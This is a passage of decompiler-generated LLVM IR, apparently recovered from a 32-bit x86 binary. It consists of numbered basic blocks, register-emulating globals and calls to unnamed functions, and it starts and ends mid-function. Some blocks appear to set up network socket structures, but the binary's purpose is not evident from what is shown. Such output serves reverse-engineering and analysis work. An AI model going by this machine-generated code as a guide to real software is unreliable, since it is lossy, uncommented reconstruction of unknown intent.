  %v5_8050f5f = load i16, i16* %v4_8050f5f, align 2
  %v11_8050f5f = icmp ult i16 %v1_8050f5f, %v5_8050f5f
  br i1 %v11_8050f5f, label %dec_label_pc_8050f53, label %dec_label_pc_8050f65

dec_label_pc_8050f65:                             ; preds = %dec_label_pc_8050f5f
  %v3_8050f65 = add i32 %v0_8050f54, 10
  %v4_8050f65 = inttoptr i32 %v3_8050f65 to i16*
  %v5_8050f65 = load i16, i16* %v4_8050f65, align 2
  %v11_8050f65 = icmp ult i16 %v1_8050f5f, %v5_8050f65
  %v1_8050f69 = icmp eq i1 %v11_8050f65, false
  br i1 %v1_8050f69, label %dec_label_pc_8050f53, label %dec_label_pc_8050f6b.loopexit

dec_label_pc_8050f6b.loopexit:                    ; preds = %dec_label_pc_8050f65
  br label %dec_label_pc_8050f6b

dec_label_pc_8050f6b:                             ; preds = %dec_label_pc_8050f6b.loopexit, %dec_label_pc_8051041
  %v0_8050f6e = phi i32 [ %v0_8050f54, %dec_label_pc_8050f6b.loopexit ], [ 0, %dec_label_pc_8051041 ]
  %v0_8050f6b = load i32, i32* @edi, align 4
  %v1_8050f6b = add i32 %v0_8050f6b, 4
  %v2_8050f6b = inttoptr i32 %v1_8050f6b to i32*
  %v3_8050f6b = load i32, i32* %v2_8050f6b, align 4
  store i32 %v3_8050f6b, i32* %ecx.global-to-local, align 4
  %v2_8050f6e = inttoptr i32 %v0_8050f6b to i32*
  store i32 %v0_8050f6e, i32* %v2_8050f6e, align 4
  %v0_8050f70 = load i32, i32* @edi, align 4
  %v1_8050f70 = add i32 %v0_8050f70, 24
  %v2_8050f70 = inttoptr i32 %v1_8050f70 to i32*
  store i32 0, i32* %v2_8050f70, align 4
  %v0_8050574.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805057c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050574

dec_label_pc_8050f7c:                             ; preds = %dec_label_pc_8050edb
  %v0_8050f7f = load i32, i32* @edi, align 4
  %v1_8050f7f = add i32 %v0_8050f7f, 4
  %v2_8050f7f = inttoptr i32 %v1_8050f7f to i32*
  %v3_8050f7f = load i32, i32* %v2_8050f7f, align 4
  store i32 %v3_8050f7f, i32* %eax.global-to-local, align 4
  %v2_8050f82 = add i32 %v0_8050f11, 16
  %v3_8050f82 = inttoptr i32 %v2_8050f82 to i32*
  store i32 %v3_8050f7f, i32* %v3_8050f82, align 4
  %v1_8050f83 = call i32 @function_80521f1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050f83, i32* %eax.global-to-local, align 4
  %v0_8050f8b = load i32, i32* @edi, align 4
  %v1_8050f8b = add i32 %v0_8050f8b, 4
  %v2_8050f8b = inttoptr i32 %v1_8050f8b to i32*
  store i32 -1, i32* %v2_8050f8b, align 4
  %v0_8050f92 = load i32, i32* @edi, align 4
  %v1_8050f92 = add i32 %v0_8050f92, 284
  %v2_8050f92 = inttoptr i32 %v1_8050f92 to i8*
  store i8 0, i8* %v2_8050f92, align 1
  %v0_8050f99 = load i32, i32* @edi, align 4
  %v1_8050f99 = add i32 %v0_8050f99, 12
  %v2_8050f99 = inttoptr i32 %v1_8050f99 to i32*
  store i32 0, i32* %v2_8050f99, align 4
  br label %dec_label_pc_805058b

dec_label_pc_8050fa5:                             ; preds = %dec_label_pc_80504a8
  %v3_8050fb0 = add nuw nsw i32 %v2_8050fb0, 1572
  %v4_8050fb0 = add i32 %v3_8050fb0, %v0_8050fb0
  %v5_8050fb0 = inttoptr i32 %v4_8050fb0 to i32*
  %v6_8050fb0 = load i32, i32* %v5_8050fb0, align 4
  %v9_8050fb0 = shl i32 1, %v1_8050faa
  %v12_8050fb0 = or i32 %v6_8050fb0, %v9_8050fb0
  store i32 %v12_8050fb0, i32* %v5_8050fb0, align 4
  %v0_8050fb8 = load i32, i32* @ebx, align 4
  %v1_8050fb8 = add i32 %v0_8050fb8, 4
  %v2_8050fb8 = inttoptr i32 %v1_8050fb8 to i32*
  %v3_8050fb8 = load i32, i32* %v2_8050fb8, align 4
  store i32 %v3_8050fb8, i32* %eax.global-to-local, align 4
  %v0_8050fbb = load i32, i32* @esi, align 4
  %v2_8050fbb = sub i32 %v0_8050fbb, %v3_8050fb8
  %v8_8050fbb = xor i32 %v0_8050fbb, %v3_8050fb8
  %v9_8050fbb = xor i32 %v2_8050fbb, %v0_8050fbb
  %v10_8050fbb = and i32 %v9_8050fbb, %v8_8050fbb
  %v11_8050fbb = icmp slt i32 %v10_8050fbb, 0
  %v13_8050fbb = icmp slt i32 %v2_8050fbb, 0
  %v2_8050fbd = icmp eq i1 %v13_8050fbb, %v11_8050fbb
  br i1 %v2_8050fbd, label %dec_label_pc_80504cb, label %dec_label_pc_8050fc3

dec_label_pc_8050fc3:                             ; preds = %dec_label_pc_8050fa5
  store i32 %v3_8050fb8, i32* @esi, align 4
  br label %dec_label_pc_80504cb

dec_label_pc_8050fd0:                             ; preds = %dec_label_pc_8050496
  %v0_8050fd0 = load i32, i32* @esp, align 4
  %v1_8050fd3 = add i32 %v2_8050488, 4
  %v2_8050fd3 = inttoptr i32 %v1_8050fd3 to i32*
  %v3_8050fd3 = load i32, i32* %v2_8050fd3, align 4
  store i32 %v3_8050fd3, i32* %edx.global-to-local, align 4
  %v2_8050fd6 = add i32 %v0_8050fd0, -16
  %v3_8050fd6 = inttoptr i32 %v2_8050fd6 to i32*
  store i32 %v3_8050fd3, i32* %v3_8050fd6, align 4
  %v1_8050fd7 = call i32 @function_80521f1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050fd7, i32* %eax.global-to-local, align 4
  %v0_8050fdf = load i32, i32* @ebx, align 4
  %v1_8050fdf = add i32 %v0_8050fdf, 4
  %v2_8050fdf = inttoptr i32 %v1_8050fdf to i32*
  store i32 -1, i32* %v2_8050fdf, align 4
  %v0_8050fe6 = load i32, i32* @ebx, align 4
  %v1_8050fe6 = add i32 %v0_8050fe6, 12
  %v2_8050fe6 = inttoptr i32 %v1_8050fe6 to i32*
  %v3_8050fe6 = load i32, i32* %v2_8050fe6, align 4
  %tmp301 = icmp ult i32 %v3_8050fe6, 3
  br i1 %tmp301, label %dec_label_pc_805101f, label %dec_label_pc_8050fec

dec_label_pc_8050fec:                             ; preds = %dec_label_pc_8050fd0
  %v1_8050fec = add i32 %v0_8050fe6, 284
  %v2_8050fec = inttoptr i32 %v1_8050fec to i8*
  %v3_8050fec = load i8, i8* %v2_8050fec, align 1
  %v4_8050fec = zext i8 %v3_8050fec to i32
  %v6_8050fec = and i32 %v1_8050fd7, -256
  %v7_8050fec = or i32 %v4_8050fec, %v6_8050fec
  %v1_8050ff2 = add i32 %v7_8050fec, 1
  %v10_8050ff2 = trunc i32 %v1_8050ff2 to i8
  store i32 %v1_8050ff2, i32* %eax.global-to-local, align 4
  store i8 %v10_8050ff2, i8* %v2_8050fec, align 1
  %v0_8050ff9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ff9 = trunc i32 %v0_8050ff9 to i8
  %v10_8050ff9 = icmp eq i8 %v1_8050ff9, 10
  %v0_805101f.pre = load i32, i32* @ebx, align 4
  br i1 %v10_8050ff9, label %dec_label_pc_805101f, label %dec_label_pc_8050ffd

dec_label_pc_8050ffd:                             ; preds = %dec_label_pc_8050fec
  store i32 %v0_805101f.pre, i32* @eax, align 4
  %v0_8050fff = call i32 @function_804f800()
  store i32 %v0_8050fff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504cb

dec_label_pc_8051010:                             ; preds = %dec_label_pc_8050e51
  %v0_8051010 = load i32, i32* @edi, align 4
  store i32 %v0_8051010, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_8051015 = call i32 @function_804f800()
  store i32 %v0_8051015, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050951

dec_label_pc_805101f:                             ; preds = %dec_label_pc_8050fec, %dec_label_pc_8050fd0
  %v0_805101f = phi i32 [ %v0_8050fe6, %dec_label_pc_8050fd0 ], [ %v0_805101f.pre, %dec_label_pc_8050fec ]
  %v1_805101f = add i32 %v0_805101f, 284
  %v2_805101f = inttoptr i32 %v1_805101f to i8*
  store i8 0, i8* %v2_805101f, align 1
  %v0_8051026 = load i32, i32* @ebx, align 4
  %v1_8051026 = add i32 %v0_8051026, 12
  %v2_8051026 = inttoptr i32 %v1_8051026 to i32*
  store i32 0, i32* %v2_8051026, align 4
  br label %dec_label_pc_80504cb

dec_label_pc_8051032:                             ; preds = %dec_label_pc_8050478
  br i1 %v5_805048d, label %dec_label_pc_80504cb, label %dec_label_pc_805103a

dec_label_pc_805103a:                             ; preds = %dec_label_pc_8051032
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050496

dec_label_pc_8051041.loopexit:                    ; preds = %dec_label_pc_8050f53
  br label %dec_label_pc_8051041

dec_label_pc_8051041:                             ; preds = %dec_label_pc_8051041.loopexit, %dec_label_pc_8050f1d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f6b

dec_label_pc_8051048:                             ; preds = %dec_label_pc_8050b3c
  %v1_8051048 = add i32 %v0_8050627, 56
  %v2_8051048 = inttoptr i32 %v1_8051048 to i32*
  %v3_8051048 = load i32, i32* %v2_8051048, align 4
  store i32 %v3_8051048, i32* %eax.global-to-local, align 4
  %v1_805104c = inttoptr i32 %v3_8051048 to i32*
  store i32 104, i32* %v1_805104c, align 4
  %v0_8050b58.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b58

dec_label_pc_8051057:                             ; preds = %dec_label_pc_8050b58
  store i32 %v0_8051057, i32* @eax, align 4
  %v0_8051059 = call i32 @function_804f800()
  store i32 %v0_8051059, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805058b

dec_label_pc_8051063:                             ; preds = %dec_label_pc_8050b0e
  %v11_8051063 = icmp eq i8 %v2_8050b0e, -5
  %v1_8051065 = icmp eq i1 %v11_8051063, false
  br i1 %v1_8051065, label %dec_label_pc_805069d, label %dec_label_pc_805106b

dec_label_pc_805106b:                             ; preds = %dec_label_pc_8051063
  store i8 -3, i8* %v1_8050b0e, align 1
  %v4_805069d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805069d

dec_label_pc_805108e:                             ; preds = %dec_label_pc_805090c
  %v1_805108e = add i32 %v0_8050927, 1
  %v8_805108e = icmp eq i32 %v1_805108e, 0
  store i32 %v1_805108e, i32* %eax.global-to-local, align 4
  br i1 %v8_805108e, label %dec_label_pc_8050934, label %dec_label_pc_8051095

dec_label_pc_8051095:                             ; preds = %dec_label_pc_805108e
  %v0_8051095 = load i32, i32* @ecx, align 4
  %v1_8051095 = load i32, i32* @esp, align 4
  %v2_8051095 = add i32 %v1_8051095, -4
  %v3_8051095 = inttoptr i32 %v2_8051095 to i32*
  store i32 %v0_8051095, i32* %v3_8051095, align 4
  %v1_8051096 = add i32 %v1_8051095, -8
  %v2_8051096 = inttoptr i32 %v1_8051096 to i32*
  store i32 0, i32* %v2_8051096, align 4
  %v1_8051098 = add i32 %v1_8051095, -12
  %v2_8051098 = inttoptr i32 %v1_8051098 to i32*
  store i32 1, i32* %v2_8051098, align 4
  %v1_805109a = add i32 %v1_8051095, -16
  %v2_805109a = inttoptr i32 %v1_805109a to i32*
  store i32 2, i32* %v2_805109a, align 4
  %v3_805109c = call i32 @function_80529e5(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_80510a1 = load i32, i32* @esp, align 4
  %v2_80510a1 = add i32 %v1_80510a1, 48
  %v3_80510a1 = inttoptr i32 %v2_80510a1 to i32*
  store i32 %v3_805109c, i32* %v3_80510a1, align 4
  %v0_80510a5 = load i32, i32* @esp, align 4
  %v1_80510a8 = add i32 %v3_805109c, 1
  %v8_80510a8 = icmp eq i32 %v1_80510a8, 0
  store i32 %v1_80510a8, i32* @eax, align 4
  %v2_80502ee = inttoptr i32 %v0_80510a5 to i32*
  br i1 %v8_80510a8, label %dec_label_pc_80502eb, label %dec_label_pc_80510af

dec_label_pc_80510af:                             ; preds = %dec_label_pc_8051095
  store i32 18, i32* %v2_80502ee, align 4
  %v2_80510b4 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80510b4, i32* %eax.global-to-local, align 4
  %v0_80510b9 = load i32, i32* @esp, align 4
  %v1_80510b9 = inttoptr i32 %v0_80510b9 to i32*
  store i32 19, i32* %v1_80510b9, align 4
  %v2_80510c0 = call i32 @function_8051300(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80510c0, i32* %eax.global-to-local, align 4
  %v0_80510c5 = load i32, i32* @esp, align 4
  %v1_80510c5 = inttoptr i32 %v0_80510c5 to i32*
  %v2_80510c5 = load i32, i32* %v1_80510c5, align 4
  store i32 %v2_80510c5, i32* %eax.global-to-local, align 4
  %v3_80510c5 = add i32 %v0_80510c5, 4
  %v1_80510c6 = inttoptr i32 %v3_80510c5 to i32*
  %v2_80510c6 = load i32, i32* %v1_80510c6, align 4
  store i32 %v2_80510c6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80510c6, align 4
  store i32 18, i32* %v1_80510c5, align 4
  %v3_80510cb = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80510cb, i32* %eax.global-to-local, align 4
  %v1_80510d0 = load i32, i32* @esp, align 4
  %v2_80510d0 = inttoptr i32 %v1_80510d0 to i32*
  store i32 %v3_80510cb, i32* %v2_80510d0, align 4
  %v2_80510d3 = call i32 @function_804f340(i8* bitcast (i32* @0 to i8*))
  store i32 %v2_80510d3, i32* %eax.global-to-local, align 4
  %v0_80510d8 = load i32, i32* @esp, align 4
  store i32 %v2_80510d3, i32* @esi, align 4
  %v2_80510dd = icmp eq i32 %v2_80510d3, 0
  br i1 %v2_80510dd, label %dec_label_pc_8050934, label %dec_label_pc_80510e5

dec_label_pc_80510e5:                             ; preds = %dec_label_pc_80510af
  %v1_80510e5 = add i32 %v0_80510d8, 1844
  %v2_80510e5 = inttoptr i32 %v1_80510e5 to i16*
  store i16 2, i16* %v2_80510e5, align 2
  %v2_80510ef = add i32 %v2_80510d3, 4
  %v3_80510ef = inttoptr i32 %v2_80510ef to i32*
  %v4_80510ef = load i32, i32* %v3_80510ef, align 4
  store i32 %v4_80510ef, i32* @ebx, align 4
  %v1_80510f2 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_80510f2 = sext i32 %v1_80510f2 to i64
  store i32 %v1_80510f2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80510f9 = load i32, i32* @esi, align 4
  %v1_80510f9 = inttoptr i32 %v0_80510f9 to i8*
  %v2_80510f9 = load i8, i8* %v1_80510f9, align 1
  %v3_80510f9 = zext i8 %v2_80510f9 to i32
  store i32 %v3_80510f9, i32* %ecx.global-to-local, align 4
  %v8_80510ff = zext i8 %v2_80510f9 to i64
  %v9_80510ff = udiv i64 %v2_80510f2, %v8_80510ff
  %v10_80510ff = trunc i64 %v9_80510ff to i32
  store i32 %v10_80510ff, i32* %eax.global-to-local, align 4
  %v11_80510ff = urem i64 %v2_80510f2, %v8_80510ff
  %v12_80510ff = trunc i64 %v11_80510ff to i32
  store i32 %v12_80510ff, i32* %edx.global-to-local, align 4
  %v0_8051101 = load i32, i32* @ebx, align 4
  %v2_8051101 = mul nuw nsw i32 %v12_80510ff, 4
  %v3_8051101 = add i32 %v2_8051101, %v0_8051101
  %v4_8051101 = inttoptr i32 %v3_8051101 to i32*
  %v5_8051101 = load i32, i32* %v4_8051101, align 4
  store i32 %v5_8051101, i32* %eax.global-to-local, align 4
  %v1_8051104 = load i32, i32* @esp, align 4
  %v2_8051104 = add i32 %v1_8051104, 1832
  %v3_8051104 = inttoptr i32 %v2_8051104 to i32*
  store i32 %v5_8051101, i32* %v3_8051104, align 4
  %v0_805110b = load i32, i32* @edi, align 4
  %v1_805110b = load i32, i32* @esp, align 4
  %v2_805110b = add i32 %v1_805110b, -4
  %v3_805110b = inttoptr i32 %v2_805110b to i32*
  store i32 %v0_805110b, i32* %v3_805110b, align 4
  %v0_805110c = load i32, i32* @edi, align 4
  %v2_805110c = add i32 %v1_805110b, -8
  %v3_805110c = inttoptr i32 %v2_805110c to i32*
  store i32 %v0_805110c, i32* %v3_805110c, align 4
  %v1_805110d = add i32 %v1_805110b, -12
  %v2_805110d = inttoptr i32 %v1_805110d to i32*
  store i32 0, i32* %v2_805110d, align 4
  %v1_805110f = add i32 %v1_805110b, -16
  %v2_805110f = inttoptr i32 %v1_805110f to i32*
  store i32 19, i32* %v2_805110f, align 4
  %v3_8051111 = call i32 @function_8051250(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_8051111 = inttoptr i32 %v3_8051111 to i16*
  store i32 %v3_8051111, i32* %eax.global-to-local, align 4
  %v3_8051116 = load i16, i16* %v4_8051111, align 2
  %v4_8051116 = zext i16 %v3_8051116 to i32
  %v7_8051116 = and i32 %v3_8051111, -65536
  %v8_8051116 = or i32 %v4_8051116, %v7_8051116
  store i32 %v8_8051116, i32* %eax.global-to-local, align 4
  %v0_8051119 = load i32, i32* @esi, align 4
  %v1_8051119 = load i32, i32* @esp, align 4
  %v2_8051119 = inttoptr i32 %v1_8051119 to i32*
  store i32 %v0_8051119, i32* %v2_8051119, align 4
  %v0_805111c = load i32, i32* %eax.global-to-local, align 4
  %v1_805111c = trunc i32 %v0_805111c to i16
  %v2_805111c = load i32, i32* @esp, align 4
  %v3_805111c = add i32 %v2_805111c, 1846
  %v4_805111c = inttoptr i32 %v3_805111c to i16*
  store i16 %v1_805111c, i16* %v4_805111c, align 2
  %v1_8051124 = call i32 @function_804f300(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051124, i32* %eax.global-to-local, align 4
  %v0_8051129 = load i32, i32* @esp, align 4
  %v1_8051129 = inttoptr i32 %v0_8051129 to i32*
  store i32 18, i32* %v1_8051129, align 4
  %v2_8051130 = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051130, i32* %eax.global-to-local, align 4
  %v0_8051135 = load i32, i32* @esp, align 4
  %v1_8051135 = inttoptr i32 %v0_8051135 to i32*
  store i32 19, i32* %v1_8051135, align 4
  %v2_805113c = call i32 @function_8051280(i8 ptrtoint (i32* @0 to i8))
  %v0_8051141 = load i32, i32* @esp, align 4
  %v1_8051141 = add i32 %v0_8051141, 1844
  store i32 %v1_8051141, i32* %eax.global-to-local, align 4
  %v1_805114b = add i32 %v0_8051141, 8
  %v2_805114b = inttoptr i32 %v1_805114b to i32*
  store i32 16, i32* %v2_805114b, align 4
  %v0_805114d = load i32, i32* %eax.global-to-local, align 4
  %v2_805114d = add i32 %v0_8051141, 4
  %v3_805114d = inttoptr i32 %v2_805114d to i32*
  store i32 %v0_805114d, i32* %v3_805114d, align 4
  %v1_805114e = add i32 %v0_8051141, 48
  %v2_805114e = inttoptr i32 %v1_805114e to i32*
  %v3_805114e = load i32, i32* %v2_805114e, align 4
  store i32 %v3_805114e, i32* %esi.global-to-local, align 4
  %v3_8051152 = inttoptr i32 %v0_8051141 to i32*
  store i32 %v3_805114e, i32* %v3_8051152, align 4
  %v3_8051153 = call i32 @function_805280a(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8051158 = load i32, i32* @esp, align 4
  %v1_8051158 = add i32 %v0_8051158, 16
  %v1_805115b = add i32 %v3_8051153, 1
  %v8_805115b = icmp eq i32 %v1_805115b, 0
  store i32 %v1_805115b, i32* %eax.global-to-local, align 4
  %v1_805115c = icmp eq i1 %v8_805115b, false
  br i1 %v1_805115c, label %dec_label_pc_8051177, label %dec_label_pc_805115e

dec_label_pc_805115e:                             ; preds = %dec_label_pc_80510e5
  br label %dec_label_pc_8051161

dec_label_pc_8051161:                             ; preds = %dec_label_pc_8051177, %dec_label_pc_805115e
  %storemerge4.in = phi i32 [ %v0_8051158, %dec_label_pc_805115e ], [ %v0_805123e, %dec_label_pc_8051177 ]
  %v1_8051161 = add i32 %storemerge4.in, 48
  %v2_8051161 = inttoptr i32 %v1_8051161 to i32*
  %v3_8051161 = load i32, i32* %v2_8051161, align 4
  store i32 %v3_8051161, i32* @edi, align 4
  %v3_8051165 = inttoptr i32 %storemerge4.in to i32*
  store i32 %v3_8051161, i32* %v3_8051165, align 4
  %v1_8051166 = call i32 @function_80521f1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051166, i32* @eax, align 4
  %v0_805116b = load i32, i32* @esp, align 4
  %v1_805116b = inttoptr i32 %v0_805116b to i32*
  store i32 0, i32* %v1_805116b, align 4
  %v1_8051172 = call i32 @function_8053d39(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051172, i32* %eax.global-to-local, align 4
  %v0_8051177.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051177

dec_label_pc_8051177:                             ; preds = %dec_label_pc_80510e5, %dec_label_pc_8051161
  %v0_8051177 = phi i32 [ %v1_8051158, %dec_label_pc_80510e5 ], [ %v0_8051177.pre, %dec_label_pc_8051161 ]
  %v1_8051177 = add i32 %v0_8051177, 1864
  %v2_8051177 = inttoptr i32 %v1_8051177 to i8*
  store i8 0, i8* %v2_8051177, align 1
  %v0_805117f = load i32, i32* @esp, align 4
  %v1_805117f = add i32 %v0_805117f, -4
  %v2_805117f = inttoptr i32 %v1_805117f to i32*
  store i32 16384, i32* %v2_805117f, align 4
  %v1_8051184 = add i32 %v0_805117f, -8
  %v2_8051184 = inttoptr i32 %v1_8051184 to i32*
  store i32 1, i32* %v2_8051184, align 4
  %v1_8051186 = add i32 %v0_805117f, 1864
  store i32 %v1_8051186, i32* %eax.global-to-local, align 4
  %v2_805118d = add i32 %v0_805117f, -12
  %v3_805118d = inttoptr i32 %v2_805118d to i32*
  store i32 %v1_8051186, i32* %v3_805118d, align 4
  %v1_805118e = add i32 %v0_805117f, 32
  %v2_805118e = inttoptr i32 %v1_805118e to i32*
  %v3_805118e = load i32, i32* %v2_805118e, align 4
  store i32 %v3_805118e, i32* @ebx, align 4
  %v2_8051192 = add i32 %v0_805117f, -16
  %v3_8051192 = inttoptr i32 %v2_8051192 to i32*
  store i32 %v3_805118e, i32* %v3_8051192, align 4
  %v0_8051193 = call i32 @function_8052934()
  %v0_8051198 = load i32, i32* @esp, align 4
  %v1_8051198 = add i32 %v0_8051198, -4
  %v2_8051198 = inttoptr i32 %v1_8051198 to i32*
  store i32 16384, i32* %v2_8051198, align 4
  %v1_805119d = add i32 %v0_8051198, -8
  %v2_805119d = inttoptr i32 %v1_805119d to i32*
  store i32 4, i32* %v2_805119d, align 4
  %v1_805119f = add i32 %v0_8051198, 1888
  store i32 %v1_805119f, i32* %eax.global-to-local, align 4
  %v2_80511a6 = add i32 %v0_8051198, -12
  %v3_80511a6 = inttoptr i32 %v2_80511a6 to i32*
  store i32 %v1_805119f, i32* %v3_80511a6, align 4
  %v1_80511a7 = add i32 %v0_8051198, 48
  %v2_80511a7 = inttoptr i32 %v1_80511a7 to i32*
  %v3_80511a7 = load i32, i32* %v2_80511a7, align 4
  store i32 %v3_80511a7, i32* %ecx.global-to-local, align 4
  %v2_80511ab = add i32 %v0_8051198, -16
  %v3_80511ab = inttoptr i32 %v2_80511ab to i32*
  store i32 %v3_80511a7, i32* %v3_80511ab, align 4
  %v0_80511ac = call i32 @function_8052934()
  %v0_80511b1 = load i32, i32* @esp, align 4
  %v1_80511b4 = add i32 %v0_80511b1, 28
  %v2_80511b4 = inttoptr i32 %v1_80511b4 to i32*
  store i32 16384, i32* %v2_80511b4, align 4
  %v1_80511b9 = add i32 %v0_80511b1, 24
  %v2_80511b9 = inttoptr i32 %v1_80511b9 to i32*
  store i32 2, i32* %v2_80511b9, align 4
  %v1_80511bb = add i32 %v0_80511b1, 1914
  store i32 %v1_80511bb, i32* %eax.global-to-local, align 4
  %v2_80511c2 = add i32 %v0_80511b1, 20
  %v3_80511c2 = inttoptr i32 %v2_80511c2 to i32*
  store i32 %v1_80511bb, i32* %v3_80511c2, align 4
  %v1_80511c3 = add i32 %v0_80511b1, 64
  %v2_80511c3 = inttoptr i32 %v1_80511c3 to i32*
  %v3_80511c3 = load i32, i32* %v2_80511c3, align 4
  store i32 %v3_80511c3, i32* %edx.global-to-local, align 4
  %v2_80511c7 = add i32 %v0_80511b1, 16
  %v3_80511c7 = inttoptr i32 %v2_80511c7 to i32*
  store i32 %v3_80511c3, i32* %v3_80511c7, align 4
  %v0_80511c8 = call i32 @function_8052934()
  store i32 %v0_80511c8, i32* %eax.global-to-local, align 4
  %v0_80511cd = load i32, i32* @esp, align 4
  %v1_80511cd = add i32 %v0_80511cd, -4
  %v2_80511cd = inttoptr i32 %v1_80511cd to i32*
  store i32 16384, i32* %v2_80511cd, align 4
  %v1_80511d2 = add i32 %v0_80511cd, -8
  %v2_80511d2 = inttoptr i32 %v1_80511d2 to i32*
  store i32 1, i32* %v2_80511d2, align 4
  %v1_80511d4 = add i32 %v0_80511cd, 52
  %v2_80511d4 = inttoptr i32 %v1_80511d4 to i32*
  %v3_80511d4 = load i32, i32* %v2_80511d4, align 4
  %v1_80511d8 = add i32 %v3_80511d4, 12
  store i32 %v1_80511d8, i32* %eax.global-to-local, align 4
  %v2_80511db = add i32 %v0_80511cd, -12
  %v3_80511db = inttoptr i32 %v2_80511db to i32*
  store i32 %v1_80511d8, i32* %v3_80511db, align 4
  %v1_80511dc = add i32 %v0_80511cd, 48
  %v2_80511dc = inttoptr i32 %v1_80511dc to i32*
  %v3_80511dc = load i32, i32* %v2_80511dc, align 4
  store i32 %v3_80511dc, i32* %eax.global-to-local, align 4
  %v2_80511e0 = add i32 %v0_80511cd, -16
  %v3_80511e0 = inttoptr i32 %v2_80511e0 to i32*
  store i32 %v3_80511dc, i32* %v3_80511e0, align 4
  %v0_80511e1 = call i32 @function_8052934()
  %v0_80511e6 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80511eb = add i32 %v0_80511e6, 28
  %v2_80511eb = inttoptr i32 %v1_80511eb to i32*
  store i32 16384, i32* %v2_80511eb, align 4
  %v1_80511f0 = add i32 %v0_80511e6, 68
  %v2_80511f0 = inttoptr i32 %v1_80511f0 to i32*
  %v3_80511f0 = load i32, i32* %v2_80511f0, align 4
  store i32 %v3_80511f0, i32* %edx.global-to-local, align 4
  %v1_80511f4 = add i32 %v3_80511f0, 12
  %v2_80511f4 = inttoptr i32 %v1_80511f4 to i8*
  %v3_80511f4 = load i8, i8* %v2_80511f4, align 1
  %v4_80511f4 = zext i8 %v3_80511f4 to i32
  %v5_80511f4 = load i32, i32* %eax.global-to-local, align 4
  %v6_80511f4 = and i32 %v5_80511f4, -256
  %v7_80511f4 = or i32 %v6_80511f4, %v4_80511f4
  store i32 %v7_80511f4, i32* %eax.global-to-local, align 4
  %v2_80511f7 = add i32 %v0_80511e6, 24
  %v3_80511f7 = inttoptr i32 %v2_80511f7 to i32*
  store i32 %v7_80511f4, i32* %v3_80511f7, align 4
  %v0_80511f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80511f8 = inttoptr i32 %v0_80511f8 to i32*
  %v2_80511f8 = load i32, i32* %v1_80511f8, align 4
  store i32 %v2_80511f8, i32* %eax.global-to-local, align 4
  %v2_80511fa = add i32 %v0_80511e6, 20
  %v3_80511fa = inttoptr i32 %v2_80511fa to i32*
  store i32 %v2_80511f8, i32* %v3_80511fa, align 4
  %v1_80511fb = add i32 %v0_80511e6, 64
  %v2_80511fb = inttoptr i32 %v1_80511fb to i32*
  %v3_80511fb = load i32, i32* %v2_80511fb, align 4
  store i32 %v3_80511fb, i32* %eax.global-to-local, align 4
  %v2_80511ff = add i32 %v0_80511e6, 16
  %v3_80511ff = inttoptr i32 %v2_80511ff to i32*
  store i32 %v3_80511fb, i32* %v3_80511ff, align 4
  %v0_8051200 = call i32 @function_8052934()
  store i32 %v0_8051200, i32* %eax.global-to-local, align 4
  %v0_8051205 = load i32, i32* @esp, align 4
  %v1_8051205 = add i32 %v0_8051205, -4
  %v2_8051205 = inttoptr i32 %v1_8051205 to i32*
  store i32 16384, i32* %v2_8051205, align 4
  %v1_805120a = add i32 %v0_8051205, -8
  %v2_805120a = inttoptr i32 %v1_805120a to i32*
  store i32 1, i32* %v2_805120a, align 4
  %v1_805120c = add i32 %v0_8051205, 52
  %v2_805120c = inttoptr i32 %v1_805120c to i32*
  %v3_805120c = load i32, i32* %v2_805120c, align 4
  %v1_8051210 = add i32 %v3_805120c, 13
  store i32 %v1_8051210, i32* %eax.global-to-local, align 4
  %v2_8051213 = add i32 %v0_8051205, -12
  %v3_8051213 = inttoptr i32 %v2_8051213 to i32*
  store i32 %v1_8051210, i32* %v3_8051213, align 4
  %v1_8051214 = add i32 %v0_8051205, 48
  %v2_8051214 = inttoptr i32 %v1_8051214 to i32*
  %v3_8051214 = load i32, i32* %v2_8051214, align 4
  store i32 %v3_8051214, i32* %eax.global-to-local, align 4
  %v2_8051218 = add i32 %v0_8051205, -16
  %v3_8051218 = inttoptr i32 %v2_8051218 to i32*
  store i32 %v3_8051214, i32* %v3_8051218, align 4
  %v0_8051219 = call i32 @function_8052934()
  %v0_805121e = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051223 = add i32 %v0_805121e, 28
  %v2_8051223 = inttoptr i32 %v1_8051223 to i32*
  store i32 16384, i32* %v2_8051223, align 4
  %v1_8051228 = add i32 %v0_805121e, 68
  %v2_8051228 = inttoptr i32 %v1_8051228 to i32*
